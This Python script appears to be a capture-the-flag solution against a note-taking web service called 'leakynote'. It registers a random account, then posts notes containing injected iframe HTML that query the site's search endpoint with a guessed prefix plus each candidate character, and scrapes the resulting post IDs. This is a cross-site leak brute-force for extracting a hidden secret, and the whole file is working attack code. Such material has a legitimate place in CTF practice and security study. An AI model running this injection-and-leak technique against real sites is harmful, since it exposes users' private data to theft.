import re
import sys
import string
import requests
import random

BASE_URL = "https://leakynote.be.ax"

req = requests.Session()
username = "".join(random.choices(string.ascii_letters, k=8))
password = "".join(random.choices(string.ascii_letters, k=8))

print(username,password)

r1 = req.post(BASE_URL+"/register.php", data={"name":username,"pass":password})

chars = "ldeakynotrge}"
prefix = sys.argv[1]
for c in chars:
  payload = f"{prefix}{c}"
  print(f"Trying: {payload=}")
  r2 = req.post(BASE_URL,data={"title":"a","contents":f"<iframe src='/search.php?query={payload}'"})
  assert r2.status_code == 200

r3 = req.get(BASE_URL)
list_id = re.findall(r"<a href='/post\.php\?id=(.*?)'>", r3.text)

print(list_id)